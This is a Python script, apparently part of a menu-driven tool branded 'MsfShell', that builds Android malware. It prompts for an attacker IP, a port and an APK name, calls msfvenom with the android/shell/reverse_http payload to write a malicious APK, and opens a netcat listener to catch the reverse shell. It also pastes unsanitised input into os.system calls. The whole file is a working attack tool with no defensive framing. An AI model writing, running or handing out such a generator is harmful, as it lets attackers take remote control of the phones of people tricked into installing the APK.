import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def and_net_http():
    os.system("clear")
    print(banner)
    print("Using: android/shell/reverse_http")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the apk: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: android/shell/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p android/shell/reverse_http LHOST="+ip+" LPORT="+port+" > "+name+".apk")
    print("Payload created! [01]")
    print("Saved in: "+name+".apk")
    print("Running NetCat Listener...")
    os.system("gnome-terminal -- nc -nlvp "+port+"")
    input("Enter to return to the menu! ")
    os.system("clear")